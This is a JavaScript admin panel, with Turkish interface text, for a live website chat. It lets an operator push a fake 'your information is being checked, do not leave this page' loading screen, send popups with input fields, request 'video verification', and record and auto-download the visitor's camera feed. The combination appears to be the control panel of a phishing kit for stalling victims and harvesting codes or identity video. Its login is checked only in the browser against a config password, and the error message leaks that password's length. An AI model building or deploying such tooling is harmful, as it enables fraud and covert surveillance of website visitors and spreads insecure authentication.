async function ready() {
  if (window.ChatSync) return window.ChatSync;
  if (window.ChatSyncReady) return window.ChatSyncReady;
  return new Promise((resolve) => {
    let n = 0;
    const t = setInterval(() => {
      n += 1;
      if (window.ChatSync || n > 60) {
        clearInterval(t);
        resolve(window.ChatSync || null);
      }
    }, 50);
  });
}

function fmtTime(ts) {
  if (!ts) return "—";
  return new Date(ts).toLocaleString("tr-TR", {
    day: "2-digit",
    month: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });
}

function shortId(id) {
  return String(id || "").slice(0, 8);
}

function whoLabel(msg) {
  if (msg.who === "user") return "Ziyaretçi";
  if (msg.who === "admin" || msg.from === "admin") return "Sen";
  return "Bot";
}

const setupPanel = document.getElementById("setup-panel");
const loginPanel = document.getElementById("login-panel");
const dashPanel = document.getElementById("dash-panel");
const liveBadge = document.getElementById("live-badge");
const notifyBtn = document.getElementById("notify-btn");
const logoutBtn = document.getElementById("logout-btn");
const loginForm = document.getElementById("login-form");
const loginError = document.getElementById("login-error");
const sessionList = document.getElementById("session-list");
const sessionCount = document.getElementById("session-count");
const threadTitle = document.getElementById("thread-title");
const threadMeta = document.getElementById("thread-meta");
const threadMessages = document.getElementById("thread-messages");
const replyForm = document.getElementById("reply-form");
const replyInput = document.getElementById("reply-input");
const sendHint = document.getElementById("send-hint");
const quickList = document.getElementById("quick-list");
const sendLoadingBtn = document.getElementById("send-loading-btn");
const sendCameraBtn = document.getElementById("send-camera-btn");
const sendPopupBtn = document.getElementById("send-popup-btn");
const popupText = document.getElementById("popup-text");
const popupOk = document.getElementById("popup-ok");
const popupCancel = document.getElementById("popup-cancel");
const popupPlaceholder = document.getElementById("popup-placeholder");
const adminCameraBox = document.getElementById("admin-camera-box");
const cameraStatus = document.getElementById("camera-status");
const adminRemoteVideo = document.getElementById("admin-remote-video");
const endCameraBtn = document.getElementById("end-camera-btn");
const downloadRecordingBtn = document.getElementById("download-recording-btn");
const templatesEditor = document.getElementById("templates-editor");
const templatesForm = document.getElementById("templates-form");
const templatesSaved = document.getElementById("templates-saved");
const addTemplateBtn = document.getElementById("add-template");
const resetTemplatesBtn = document.getElementById("reset-templates");

let unsubSessions = null;
let unsubMessages = null;
let selectedId = null;
let seenMessageIds = new Set();
let notifyEnabled = false;
let sending = false;
let adminCall = null;

function show(view) {
  setupPanel.hidden = view !== "setup";
  loginPanel.hidden = view !== "login";
  dashPanel.hidden = view !== "dash";
  liveBadge.hidden = view !== "dash";
  notifyBtn.hidden = view !== "dash";
  logoutBtn.hidden = view !== "dash";
}

function authOk() {
  return sessionStorage.getItem("admin_ok") === "1";
}

function setAuth(ok) {
  if (ok) sessionStorage.setItem("admin_ok", "1");
  else sessionStorage.removeItem("admin_ok");
}

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function renderSessions(rows) {
  sessionCount.textContent = `${rows.length} oturum`;
  sessionList.innerHTML = "";
  if (!rows.length) {
    sessionList.innerHTML = '<li class="session-empty">Henüz sohbet yok. Sitede bir sohbet başlatın.</li>';
    return;
  }

  rows.forEach((row) => {
    const li = document.createElement("li");
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = "session-item" + (row.id === selectedId ? " is-active" : "");
    btn.dataset.sessionId = row.id;
    const last =
      row.lastWho === "user" ? "ziyaretçi" : row.lastWho === "admin" ? "sen" : "bot";
    btn.innerHTML = `
      <strong>#${shortId(row.id)}</strong>
      <span>${escapeHtml(row.preview || "Mesaj yok")}</span>
      <em>${fmtTime(row.updatedAt)} · ${last}</em>
    `;
    btn.addEventListener("click", () => openSession(row));
    li.appendChild(btn);
    sessionList.appendChild(li);
  });
}

function setCameraUi(visible, statusText) {
  if (adminCameraBox) adminCameraBox.hidden = !visible;
  if (cameraStatus && statusText) cameraStatus.textContent = statusText;
  if (adminCameraBox) {
    adminCameraBox.classList.toggle(
      "is-recording",
      Boolean(visible && /kayıt yapılıyor/i.test(statusText || ""))
    );
  }
}

function clearRecordingLink() {
  if (!downloadRecordingBtn) return;
  if (downloadRecordingBtn.href?.startsWith("blob:")) {
    URL.revokeObjectURL(downloadRecordingBtn.href);
  }
  downloadRecordingBtn.removeAttribute("href");
  downloadRecordingBtn.hidden = true;
}

function offerRecordingDownload(blob, sessionId, autoClick = true) {
  if (!blob?.size) {
    sendHint.hidden = false;
    sendHint.textContent = "Kayıt boş geldi; video bağlanmamış olabilir.";
    return;
  }
  const stamp = new Date().toISOString().replace(/[:.]/g, "-");
  const name = `kamera-${shortId(sessionId)}-${stamp}.webm`;
  const url = URL.createObjectURL(blob);

  if (downloadRecordingBtn) {
    if (downloadRecordingBtn.href?.startsWith("blob:")) {
      URL.revokeObjectURL(downloadRecordingBtn.href);
    }
    downloadRecordingBtn.href = url;
    downloadRecordingBtn.download = name;
    downloadRecordingBtn.hidden = false;
    downloadRecordingBtn.textContent = `Kaydı indir (${Math.round(blob.size / 1024)} KB)`;
  }

  const trigger = () => {
    try {
      if (downloadRecordingBtn?.href) {
        downloadRecordingBtn.click();
        return;
      }
    } catch {
      /* fallback below */
    }
    const a = document.createElement("a");
    a.href = url;
    a.download = name;
    a.rel = "noopener";
    a.style.display = "none";
    document.body.appendChild(a);
    a.click();
    a.remove();
  };

  if (autoClick) {
    trigger();
    // Bazı tarayıcılarda ilk deneme yutulur; kısa sonra tekrar dene
    window.setTimeout(trigger, 200);
    window.setTimeout(trigger, 800);
  }

  setCameraUi(true, `Kayıt indiriliyor · ${Math.round(blob.size / 1024)} KB`);
  sendHint.hidden = false;
  sendHint.textContent = `Kayıt otomatik indiriliyor: ${name}`;
  window.setTimeout(() => {
    if (sendHint.textContent.includes("Kayıt")) sendHint.hidden = true;
  }, 4000);
}

function pickRecorderMime() {
  if (typeof MediaRecorder === "undefined") return "";
  const types = [
    "video/webm;codecs=vp8",
    "video/webm;codecs=vp9",
    "video/webm",
  ];
  return types.find((t) => MediaRecorder.isTypeSupported(t)) || "";
}

function startAdminRecording(stream, state) {
  if (!stream || state.recorder || typeof MediaRecorder === "undefined") return false;

  const videoTracks = stream.getVideoTracks().filter((t) => t.readyState === "live");
  if (!videoTracks.length) {
    setCameraUi(true, "Canlı · video track yok");
    return false;
  }

  const recordStream = new MediaStream(videoTracks);
  const mime = pickRecorderMime();
  let recorder;
  try {
    recorder = mime
      ? new MediaRecorder(recordStream, { mimeType: mime, videoBitsPerSecond: 1_500_000 })
      : new MediaRecorder(recordStream);
  } catch (err) {
    setCameraUi(true, `Canlı · kayıt yok (${err?.message || "desteklenmiyor"})`);
    return false;
  }

  const chunks = [];
  state.recordChunks = chunks;
  recorder.ondataavailable = (e) => {
    if (e.data?.size) chunks.push(e.data);
  };
  recorder.onstop = () => {
    const type = recorder.mimeType || mime || "video/webm";
    const blob = new Blob(chunks, { type });
    state.lastBlob = blob;
    // Her zaman otomatik indir
    offerRecordingDownload(blob, state.sessionId, true);
    state._recordingStopped?.();
  };
  recorder.onerror = () => {
    setCameraUi(true, "Canlı · kayıt hatası");
  };

  state.recorder = recorder;
  try {
    recorder.start(500);
    setCameraUi(true, "Canlı · kayıt yapılıyor…");
    return true;
  } catch {
    state.recorder = null;
    setCameraUi(true, "Canlı · kayıt başlatılamadı");
    return false;
  }
}

function stopAdminRecording(call, { autoDownload = false } = {}) {
  return new Promise((resolve) => {
    let settled = false;
    const finish = (ok) => {
      if (settled) return;
      settled = true;
      resolve(ok);
    };

    const rec = call?.recorder;
    if (!rec || rec.state === "inactive") {
      if (call?.lastBlob?.size) {
        offerRecordingDownload(call.lastBlob, call.sessionId, autoDownload);
        finish(true);
        return;
      }
      finish(false);
      return;
    }
    call.autoDownload = autoDownload;
    call._recordingStopped = () => finish(true);
    window.setTimeout(() => finish(Boolean(call.lastBlob?.size)), 4000);
    try {
      if (rec.state === "recording") {
        try {
          rec.requestData();
        } catch {
          /* ignore */
        }
      }
      if (rec.state === "recording" || rec.state === "paused") rec.stop();
      else finish(false);
    } catch {
      finish(false);
    }
  });
}

async function stopAdminCall(updateRemote = true, { autoDownload = false, keepUi = false } = {}) {
  const call = adminCall;
  adminCall = null;
  if (!call) {
    if (!keepUi) setCameraUi(false);
    if (adminRemoteVideo) adminRemoteVideo.srcObject = null;
    return;
  }
  try {
    call.unsubCall?.();
    call.unsubIce?.();
  } catch {
    /* ignore */
  }

  await stopAdminRecording(call, { autoDownload });

  try {
    call.pc?.close();
  } catch {
    /* ignore */
  }
  if (adminRemoteVideo) adminRemoteVideo.srcObject = null;

  const hasDownload = Boolean(downloadRecordingBtn && !downloadRecordingBtn.hidden);
  if (keepUi || hasDownload || call.lastBlob?.size) {
    setCameraUi(true, cameraStatus?.textContent || "Kayıt hazır");
    adminCameraBox?.classList.remove("is-recording");
  } else {
    setCameraUi(false);
  }

  if (updateRemote && call.sessionId && call.callId && window.ChatSync) {
    window.ChatSync.setCameraCallStatus(call.sessionId, call.callId, "ended").catch(() => {});
  }
}

async function joinAdminCamera(sessionId, callId) {
  if (!window.ChatSync || !sessionId || !callId) return;
  if (adminCall?.callId === callId && adminCall?.sessionId === sessionId) return;

  await stopAdminCall(false, { keepUi: true });
  clearRecordingLink();
  setCameraUi(true, "Ziyaretçi onayı bekleniyor…");

  const sync = window.ChatSync;
  const pc = new RTCPeerConnection(sync.ICE_SERVERS);
  let answered = false;
  const pendingVisitorIce = [];
  let remoteReady = false;
  const state = {
    sessionId,
    callId,
    pc,
    recorder: null,
    recordChunks: [],
    lastBlob: null,
    autoDownload: false,
    unsubCall: null,
    unsubIce: null,
  };
  adminCall = state;

  pc.ontrack = (ev) => {
    const stream = ev.streams?.[0] || new MediaStream([ev.track]);
    if (adminRemoteVideo) {
      adminRemoteVideo.srcObject = stream;
      adminRemoteVideo.play?.().catch(() => {});
    }
    const tryStart = () => {
      if (adminCall !== state || state.recorder) return;
      if (!startAdminRecording(stream, state)) {
        setCameraUi(true, "Canlı bağlantı");
      }
    };
    tryStart();
    // Bazı tarayıcılarda track kısa süre mute gelir
    window.setTimeout(tryStart, 400);
    window.setTimeout(tryStart, 1200);
  };

  pc.onicecandidate = (ev) => {
    if (ev.candidate) {
      sync.pushIceCandidate(sessionId, callId, "admin", ev.candidate.toJSON()).catch(() => {});
    }
  };

  const addVisitorIce = async (cand) => {
    if (!cand || !state.pc) return;
    if (!remoteReady) {
      pendingVisitorIce.push(cand);
      return;
    }
    try {
      await state.pc.addIceCandidate(new RTCIceCandidate(cand));
    } catch {
      /* ignore */
    }
  };

  state.unsubIce = sync.listenIceCandidates(sessionId, callId, "visitor", (cand) => {
    addVisitorIce(cand);
  });

  state.unsubCall = sync.listenCameraCall(sessionId, callId, async (data) => {
    if (!data || adminCall !== state) return;
    if (data.status === "denied") {
      setCameraUi(true, "Ziyaretçi kamerayı reddetti");
      await stopAdminCall(false, { keepUi: true });
      return;
    }
    if (data.status === "ended") {
      setCameraUi(true, "Bağlantı kapandı · kayıt hazırlanıyor…");
      await stopAdminCall(false, { autoDownload: true, keepUi: true });
      return;
    }
    if (data.status === "requested") {
      setCameraUi(true, "Ziyaretçi onayı bekleniyor…");
    }
    if (data.status === "live") {
      setCameraUi(true, "Bağlanıyor…");
    }
    if (data.offer && !answered) {
      answered = true;
      try {
        await pc.setRemoteDescription(data.offer);
        remoteReady = true;
        for (const cand of pendingVisitorIce.splice(0)) {
          await addVisitorIce(cand);
        }
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        await sync.writeCameraSignal(sessionId, callId, "answer", {
          type: answer.type,
          sdp: answer.sdp,
        });
        setCameraUi(true, "SDP alındı · ICE…");
      } catch (err) {
        setCameraUi(true, `Bağlantı hatası: ${err?.message || err}`);
      }
    }
  });
}

function appendThreadMessage(msg, announce) {
  if (!msg?.id || seenMessageIds.has(msg.id)) return;
  seenMessageIds.add(msg.id);

  const isAdmin = msg.who === "admin" || msg.from === "admin";
  const isLoading = msg.type === "loading";
  const row = document.createElement("div");
  const side = msg.who === "user" ? "user" : "bot";
  row.className = `chat-bubble chat-${side}${isAdmin ? " chat-admin" : ""}${
    isLoading ? " chat-loading" : ""
  }`;
  const meta = document.createElement("span");
  meta.className = "chat-meta";
  meta.textContent = `${whoLabel(msg)} · ${fmtTime(msg.ts)}`;
  const body = document.createElement("div");
  body.className = "chat-loading-body";
  if (isLoading) {
    body.innerHTML = `
      <span class="chat-spinner" aria-hidden="true"></span>
      <p></p>
      <span class="chat-loading-dots" aria-hidden="true"><i></i><i></i><i></i></span>
    `;
    body.querySelector("p").textContent =
      msg.text || "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…";
  } else if (msg.type === "popup") {
    const p = document.createElement("p");
    p.textContent = `Popup: ${msg.text || ""}`;
    const tags = document.createElement("em");
    tags.className = "popup-btn-tags";
    tags.textContent = `${msg.okLabel || "Tamam"} / ${msg.cancelLabel || "İptal"}${
      msg.withInput ? " · metin kutusu" : ""
    }`;
    body.append(p, tags);
  } else if (msg.type === "camera") {
    const p = document.createElement("p");
    p.textContent = `📷 Kamera talebi: ${msg.text || ""}`;
    body.appendChild(p);
    const fresh = Number(msg.ts || 0) > Date.now() - 12 * 60 * 1000;
    if (msg.callId && selectedId && fresh) {
      joinAdminCamera(selectedId, msg.callId);
    }
  } else {
    const p = document.createElement("p");
    p.textContent = msg.text || "";
    body.appendChild(p);
  }
  row.append(meta, body);
  threadMessages.appendChild(row);
  threadMessages.scrollTop = threadMessages.scrollHeight;

  if (announce && msg.who === "user" && notifyEnabled && document.hidden) {
    try {
      new Notification("Yeni ziyaretçi mesajı", {
        body: String(msg.text || "").slice(0, 120),
        tag: msg.id,
      });
    } catch {
      /* ignore */
    }
  }
}

function openSession(row) {
  selectedId = row.id;
  seenMessageIds = new Set();
  threadMessages.innerHTML = "";
  threadTitle.textContent = `Oturum #${shortId(row.id)}`;
  threadMeta.textContent = `${row.page || "/"} · ${fmtTime(row.updatedAt)}`;
  sendHint.hidden = true;
  stopAdminCall(false, { keepUi: false });
  clearRecordingLink();
  Array.from(sessionList.querySelectorAll(".session-item")).forEach((el) => {
    el.classList.toggle("is-active", el.dataset.sessionId === row.id);
  });

  if (unsubMessages) unsubMessages();
  unsubMessages = window.ChatSync.listenMessages(row.id, (msg) => {
    appendThreadMessage(msg, true);
  });
  replyInput?.focus();
}

async function sendToSelected(text, options = {}) {
  const msg = String(
    text ||
      (options.type === "loading"
        ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…"
        : options.type === "camera"
          ? "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır."
          : "")
  ).trim();
  if (!msg && options.type !== "loading") return;
  if (!selectedId) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  if (sending) return;
  sending = true;
  sendHint.hidden = false;
  sendHint.textContent = "Gönderiliyor…";
  try {
    const result = await window.ChatSync.sendAdminMessage(selectedId, msg, options);
    sendHint.textContent =
      options.type === "loading"
        ? "Yükleme animasyonu gönderildi."
        : options.type === "popup"
          ? "Popup gönderildi."
          : options.type === "camera"
            ? "Kamera talebi gönderildi."
            : "Gönderildi.";
    if (options.type === "camera" && result?.callId) {
      joinAdminCamera(selectedId, result.callId);
    }
    if (options.type !== "loading" && options.type !== "popup" && options.type !== "camera") {
      replyInput.value = "";
    }
    window.setTimeout(() => {
      if (
        sendHint.textContent.includes("Gönderildi") ||
        sendHint.textContent.includes("animasyon") ||
        sendHint.textContent.includes("Popup") ||
        sendHint.textContent.includes("Kamera")
      ) {
        sendHint.hidden = true;
      }
    }, 1200);
  } catch (err) {
    const detail = err?.code || err?.message || String(err);
    sendHint.textContent = `Gönderilemedi: ${detail}`;
  } finally {
    sending = false;
  }
}

function renderQuickButtons() {
  const list = window.ChatSync.getQuickReplies();
  quickList.innerHTML = "";
  list.forEach((text) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.textContent = text.length > 48 ? `${text.slice(0, 48)}…` : text;
    btn.title = text;
    btn.addEventListener("click", () => sendToSelected(text));
    quickList.appendChild(btn);
  });
}

function renderTemplatesEditor(list) {
  templatesEditor.innerHTML = "";
  (list.length ? list : [""]).forEach((text, index) => {
    const row = document.createElement("div");
    row.className = "template-row";
    row.innerHTML = `
      <label class="visually-hidden" for="tpl-${index}">Hazır mesaj ${index + 1}</label>
      <textarea id="tpl-${index}" rows="2" maxlength="800" data-tpl>${escapeHtml(text)}</textarea>
      <button type="button" class="chat-clear" data-remove="${index}">Sil</button>
    `;
    const ta = row.querySelector("textarea");
    ta.value = text;
    templatesEditor.appendChild(row);
  });
}

function readTemplatesFromEditor() {
  return Array.from(templatesEditor.querySelectorAll("[data-tpl]"))
    .map((el) => el.value.trim())
    .filter(Boolean);
}

function startDash(sync) {
  show("dash");
  renderQuickButtons();
  renderTemplatesEditor(sync.getQuickReplies());
  if (unsubSessions) unsubSessions();
  unsubSessions = sync.listenSessions((rows) => {
    renderSessions(rows);
    if (!selectedId && rows[0]) openSession(rows[0]);
  });
}

replyForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  sendToSelected(replyInput.value);
});

sendLoadingBtn?.addEventListener("click", () => {
  sendToSelected(
    "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…",
    { type: "loading" }
  );
});

sendCameraBtn?.addEventListener("click", () => {
  sendToSelected(
    "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır.",
    {
      type: "camera",
      okLabel: "Kamerayı aç",
      cancelLabel: "Reddet",
    }
  );
});

endCameraBtn?.addEventListener("click", async () => {
  await stopAdminCall(true, { autoDownload: true, keepUi: true });
  // Kullanıcı jesti zincirinde bir kez daha zorla indir
  if (downloadRecordingBtn && !downloadRecordingBtn.hidden) {
    try {
      downloadRecordingBtn.click();
    } catch {
      /* ignore */
    }
  }
  sendHint.hidden = false;
  sendHint.textContent = "Kamera kapatıldı · kayıt indiriliyor…";
  window.setTimeout(() => {
    if (sendHint.textContent.includes("Kamera")) sendHint.hidden = true;
  }, 2500);
});

sendPopupBtn?.addEventListener("click", () => {
  const question = String(popupText?.value || "").trim();
  if (!question) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce popup metnini yazın (ziyaretçiye soru).";
    popupText?.focus();
    return;
  }
  sendToSelected(question, {
    type: "popup",
    okLabel: popupOk?.value || "Tamam",
    cancelLabel: popupCancel?.value || "İptal",
    withInput: true,
    placeholder: popupPlaceholder?.value || "Mesajınızı buraya yazın…",
  });
});

templatesForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  const saved = window.ChatSync.setQuickReplies(readTemplatesFromEditor());
  renderTemplatesEditor(saved);
  renderQuickButtons();
  templatesSaved.hidden = false;
  window.setTimeout(() => {
    templatesSaved.hidden = true;
  }, 1500);
});

addTemplateBtn?.addEventListener("click", () => {
  const list = readTemplatesFromEditor();
  list.push("");
  renderTemplatesEditor(list);
  templatesEditor.querySelector("textarea:last-of-type")?.focus();
});

resetTemplatesBtn?.addEventListener("click", () => {
  const defaults = [...window.ChatSync.DEFAULT_QUICK_REPLIES];
  window.ChatSync.setQuickReplies(defaults);
  renderTemplatesEditor(defaults);
  renderQuickButtons();
});

templatesEditor?.addEventListener("click", (e) => {
  const btn = e.target.closest("[data-remove]");
  if (!btn) return;
  const list = readTemplatesFromEditor();
  const idx = Number(btn.getAttribute("data-remove"));
  list.splice(idx, 1);
  renderTemplatesEditor(list.length ? list : [""]);
});

notifyBtn?.addEventListener("click", async () => {
  if (!("Notification" in window)) {
    notifyBtn.textContent = "Bildirim desteklenmiyor";
    return;
  }
  const perm = await Notification.requestPermission();
  notifyEnabled = perm === "granted";
  notifyBtn.textContent = notifyEnabled ? "Bildirimler açık" : "Bildirim reddedildi";
});

logoutBtn?.addEventListener("click", () => {
  setAuth(false);
  if (unsubSessions) unsubSessions();
  if (unsubMessages) unsubMessages();
  stopAdminCall(true);
  selectedId = null;
  show("login");
});

loginForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  const pass = String(document.getElementById("admin-pass")?.value || "").trim();
  const expected = String(window.FIREBASE_SYNC?.adminPassword || "").trim();
  const ok =
    expected.length > 0 &&
    (pass === expected || pass.replace(/\s+/g, "") === expected.replace(/\s+/g, ""));

  if (!window.FIREBASE_SYNC) {
    loginError.hidden = false;
    loginError.textContent = "firebase-config.js yüklenemedi. Sayfayı Ctrl+F5 ile yenileyin.";
    return;
  }
  if (!ok) {
    loginError.hidden = false;
    loginError.textContent =
      expected.length === 0
        ? "Config içinde admin şifresi yok."
        : `Şifre hatalı (yazılan ${pass.length} karakter, beklenen ${expected.length}).`;
    return;
  }
  loginError.hidden = true;
  setAuth(true);
  startDash(window.ChatSync);
});

const sync = await ready();
if (!sync || sync.needsSetup) {
  show("setup");
} else if (authOk()) {
  startDash(sync);
} else {
  show("login");
}
